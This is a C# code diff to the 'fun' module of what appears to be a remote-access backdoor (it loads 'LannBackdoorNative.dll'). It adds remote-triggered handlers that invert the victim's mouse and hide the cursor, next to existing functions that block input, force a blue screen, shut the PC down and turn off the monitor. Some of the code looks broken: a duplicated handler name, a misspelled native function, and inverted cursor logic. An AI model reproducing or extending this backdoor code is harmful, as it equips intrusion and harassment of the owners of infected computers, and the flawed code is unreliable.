@@ -18,11 +18,17 @@ public class FunModuleImpl : IModule {
     [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
     private static extern bool BlockInput([In] [MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
 
+    [DllImport("user32.dll")]
+    private static extern int ShowCursor(bool bShow);
+    
     [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
     private static extern void RaiseBSOD();
 
     [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
     private static extern void ShutdownPC(bool restart);
+    
+    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+    private static extern void ToggleMouseInvese(bool turnOn);
 
     [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
     private static extern void ToggleMonitor(bool turnOn);
@@ -79,5 +85,33 @@ public class FunModuleImpl : IModule {
         }
 
         await Callback(client, "toggleMonitor", result);
+    }
+    
+    [Handler("toggleMouseInverse")]
+    public async Task ToggleMonitorHandler(TCPClient client, ToggleMouseHandlerData data) {
+        ToggleMouseResult result = new();
+        try {
+            ToggleMouseInvese(data.Enable);
+            result.Success = true;
+        } catch (Exception error) {
+            result.Error = error.Message;
+            result.Success = false;
+        }
+
+        await Callback(client, "toggleMouseInverse", result);
+    }
+    
+    [Handler("toggleCursorHide")]
+    public async Task ToggleCursorHideHandler(TCPClient client, ToggleCursorHideHandlerData data) {
+        ToggleCursorHideResult result = new();
+        try {
+            ShowCursor(data.Enable);
+            result.Success = true;
+        } catch (Exception error) {
+            result.Error = error.Message;
+            result.Success = false;
+        }
+
+        await Callback(client, "toggleCursorHide", result);
     }
 }
